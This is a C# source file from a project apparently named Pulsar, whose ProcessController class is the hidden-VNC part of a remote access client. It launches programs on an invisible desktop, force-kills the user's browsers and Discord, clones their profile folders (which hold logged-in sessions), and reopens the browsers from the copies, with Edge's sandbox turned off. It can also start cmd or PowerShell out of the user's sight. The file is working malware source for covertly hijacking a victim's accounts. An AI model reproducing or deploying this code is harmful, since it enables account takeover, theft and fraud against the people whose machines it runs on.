using Microsoft.Win32;
using Pulsar.Client.Helper.HVNC.Chromium;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace Pulsar.Client.Helper.HVNC
{
    public class ProcessController
    {
        public ProcessController(string DesktopName)
        {
            this.DesktopName = DesktopName;
        }

        [DllImport("kernel32.dll")]
        private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, int dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);

        private void CloneDirectory(string sourceDir, string destinationDir)
        {
            if (!Directory.Exists(sourceDir))
            {
                throw new DirectoryNotFoundException($"Source directory '{sourceDir}' not found.");
            }

            Directory.CreateDirectory(destinationDir);

            var directories = Directory.GetDirectories(sourceDir, "*", SearchOption.AllDirectories);
            var files = Directory.GetFiles(sourceDir, "*", SearchOption.AllDirectories);

            foreach (var dir in directories)
            {
                try
                {
                    string targetDir = dir.Replace(sourceDir, destinationDir);
                    Directory.CreateDirectory(targetDir);
                }
                catch (Exception) { }
            }

            foreach (var file in files)
            {
                try
                {
                    string targetFile = file.Replace(sourceDir, destinationDir);
                    File.Copy(file, targetFile, true);
                }
                catch (UnauthorizedAccessException) { }
                catch (IOException) { }
                catch (Exception) { }
            }
        }

        private static bool DeleteFolder(string folderPath)
        {
            bool result;
            try
            {
                if (Directory.Exists(folderPath))
                {
                    Directory.Delete(folderPath, true);
                    result = true;
                }
                else
                {
                    Debug.WriteLine("Folder does not exist.");
                    result = false;
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Error deleting folder: " + ex.Message);
                result = false;
            }
            return result;
        }

        public void StartCmd()
        {
            string path = "conhost cmd.exe";
            this.CreateProc(path);
        }

        public void StartPowershell()
        {
            string path = "conhost powershell.exe";
            this.CreateProc(path);
        }

        public void StartGeneric(string path)
        {
            string command = "conhost " + path;
            this.CreateProc(command);
        }

        public void StartFirefox()
        {
            try
            {
                string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Mozilla\\Firefox\\";

                if (!Directory.Exists(path))
                {
                    return;
                }

                string sourceDir = Path.Combine(path, "Profiles");
                if (!Directory.Exists(sourceDir))
                {
                    return;
                }

                string text = Path.Combine(path, "fudasf");
                string filePath = "Conhost --headless cmd.exe /c taskkill /IM firefox.exe /F";
                if (!Directory.Exists(text))
                {
                    Directory.CreateDirectory(text);
                    this.CreateProc(filePath);
                    this.CloneDirectory(sourceDir, text);
                }
                else
                {
                    DeleteFolder(text);
                    this.StartFirefox();
                    return;
                }

                string filePath2 = "Conhost --headless cmd.exe /c start firefox --profile=\"" + text + "\"";
                this.CreateProc(filePath2);
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Error starting Firefox: " + ex.Message);
            }
        }

        public void StartBrave()
        {
            try
            {
                string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\User Data";

                if (!Directory.Exists(path))
                {
                    return;
                }

                string filePath = "Conhost --headless cmd.exe /c taskkill /IM brave.exe /F";
                this.CreateProc(filePath);

                PrinterPatcher patcher = new PrinterPatcher(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\BraveSoftware\\Brave-Browser\\Application", "\\BraveSoftware");
                patcher.Start();
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Error starting Brave: " + ex.Message);
            }
        }

        public void StartOpera()
        {
            try
            {
                string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera\\";
                if (!Directory.Exists(path)) return;

                string sourceDir = path;
                string text = Path.Combine(Path.GetDirectoryName(path), "fudasf");
                string killCommand = "Conhost --headless cmd.exe /c taskkill /IM opera.exe /F";

                if (!Directory.Exists(text))
                {
                    Directory.CreateDirectory(text);
                    this.CreateProc(killCommand);
                    this.CloneDirectory(sourceDir, text);
                }
                else
                {
                    DeleteFolder(text);
                    this.StartOpera();
                    return;
                }

                string startCommand = "Conhost --headless cmd.exe /c start opera.exe --user-data-dir=\"" + text + "\"";
                this.CreateProc(startCommand);
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Error starting Opera: " + ex.Message);
            }
        }

        public void StartOperaGX()
        {
            try
            {
                string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera GX Stable\\";
                if (!Directory.Exists(path)) return;

                string sourceDir = path;
                string text = Path.Combine(Path.GetDirectoryName(path), "fudasf");
                string killCommand = "Conhost --headless cmd.exe /c taskkill /IM operagx.exe /F";

                if (!Directory.Exists(text))
                {
                    Directory.CreateDirectory(text);
                    this.CreateProc(killCommand);
                    this.CloneDirectory(sourceDir, text);
                }
                else
                {
                    DeleteFolder(text);
                    this.StartOperaGX();
                    return;
                }

                string startCommand = "Conhost --headless cmd.exe /c start operagx.exe --user-data-dir=\"" + text + "\"";
                this.CreateProc(startCommand);
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Error starting OperaGX: " + ex.Message);
            }
        }

        public void StartEdge()
        {
            try
            {
                string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\";

                if (!Directory.Exists(path))
                {
                    return;
                }

                string sourceDir = Path.Combine(path, "User Data");
                if (!Directory.Exists(sourceDir))
                {
                    return;
                }

                string text = Path.Combine(path, "fudasf");
                string filePath = "Conhost --headless cmd.exe /c taskkill /IM msedge.exe /F";

                if (!Directory.Exists(text))
                {
                    Directory.CreateDirectory(text);
                    this.CreateProc(filePath);
                    this.CloneDirectory(sourceDir, text);
                }
                else
                {
                    DeleteFolder(text);
                    this.StartEdge();
                    return;
                }

                string filePath2 = "Conhost --headless cmd.exe /c start msedge.exe --start-maximized --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-data-dir=\"" + text + "\"";
                this.CreateProc(filePath2);
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Error starting Edge: " + ex.Message);
            }
        }

        public void Startchrome()
        {
            try
            {
                string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\";

                if (!Directory.Exists(path))
                {
                    return;
                }

                //string sourceDir = Path.Combine(path, "User Data");
                //string text = Path.Combine(Environment.GetEnvironmentVariable("TEMP"), "\\FakeAppData");
                string filePath = "Conhost --headless cmd.exe /c taskkill /IM chrome.exe /F";
                this.CreateProc(filePath);
                //if (!Directory.Exists(text))
                //{
                //    Directory.CreateDirectory(text);
                //    this.CreateProc(filePath);
                //    this.CloneDirectory(sourceDir, text);
                //}
                //else
                //{
                //    DeleteFolder(text);
                //    this.Startchrome();
                //}

                PrinterPatcher patcher = new PrinterPatcher(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Google\\Chrome\\Application\\chrome.exe", Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Google\\Chrome\\Application", "\\Google");
                patcher.Start();
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Error starting Chrome: " + ex.Message);
                return;
            }
            return;
        }

        public void StartDiscord()
        {
            string discordPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Discord\\Update.exe";
            if (!File.Exists(discordPath)) return;

            string killCommand = "Conhost --headless cmd.exe /c taskkill /IM discord.exe /F";
            this.CreateProc(killCommand);
            Thread.Sleep(1000);
            string startCommand = "\"" + discordPath + "\" --processStart Discord.exe";
            this.CreateProc(startCommand);
        }

        public void StartExplorer()
        {
            uint num = 2U;
            string name = "TaskbarGlomLevel";
            string name2 = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced";
            using (RegistryKey registryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(name2, true))
            {
                if (registryKey != null)
                {
                    object value = registryKey.GetValue(name);
                    if (value is uint)
                    {
                        uint num2 = (uint)value;
                        if (num2 != num)
                        {
                            registryKey.SetValue(name, num, RegistryValueKind.DWord);
                        }
                    }
                }
            }
            string explorerPath = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\explorer.exe /NoUACCheck";
            this.CreateProc(explorerPath);
        }

        public bool CreateProc(string filePath)
        {
            STARTUPINFO structure = default(STARTUPINFO);
            structure.cb = Marshal.SizeOf<STARTUPINFO>(structure);
            structure.lpDesktop = this.DesktopName;
            PROCESS_INFORMATION process_INFORMATION = default(PROCESS_INFORMATION);
            return CreateProcess(null, filePath, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref structure, ref process_INFORMATION);
        }

        private string DesktopName;

        private struct STARTUPINFO
        {
            public int cb;

            public string lpReserved;

            public string lpDesktop;

            public string lpTitle;

            public int dwX;

            public int dwY;

            public int dwXSize;

            public int dwYSize;

            public int dwXCountChars;

            public int dwYCountChars;

            public int dwFillAttribute;

            public int dwFlags;

            public short wShowWindow;

            public short cbReserved2;

            public IntPtr lpReserved2;

            public IntPtr hStdInput;

            public IntPtr hStdOutput;

            public IntPtr hStdError;
        }

        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;

            public IntPtr hThread;

            public int dwProcessId;

            public int dwThreadId;
        }
    }
}